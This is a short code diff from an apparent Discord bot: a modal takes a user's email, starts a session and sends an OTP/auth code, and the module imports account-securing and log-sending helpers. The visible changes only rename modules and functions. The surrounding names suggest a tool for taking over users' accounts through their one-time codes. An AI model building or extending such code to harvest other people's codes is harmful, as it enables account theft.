@@ -7,15 +7,15 @@ import asyncio
 import json
 import re
 
-from ui.buttons.code_btn import ButtonViewTwo
+from ui.buttons.submit_code import ButtonViewTwo
 from ui.buttons.missing_email import ButtonViewThree
 from ui.buttons.embed_buttons import ButtonOptions
 from ui.buttons.account_details import accountInfo
 
 from securing.secure import startSecuringAccount
-from auth.initialSession import getSession
-from shared.sendLogs import sendLogs
-from auth.sendAuth import sendAuth
+from auth.initial_session import get_session
+from shared.send_logs import sendLogs
+from auth.send_auth import send_auth
 
 class MyModalOne(ui.Modal):
     def __init__(self):
@@ -81,10 +81,10 @@ class MyModalOne(ui.Modal):
 
         await interaction.response.defer(ephemeral=True)
 
-        self.session = getSession()
+        self.session = get_session()
 
         # Sends OTP/Auth code
-        emailInfo = await sendAuth(self.session, email)
+        emailInfo = await send_auth(self.session, email)
 
         # Email does not exist (ifExistsResults == 1 can be used as an alternative)
         if "Credentials" not in emailInfo:
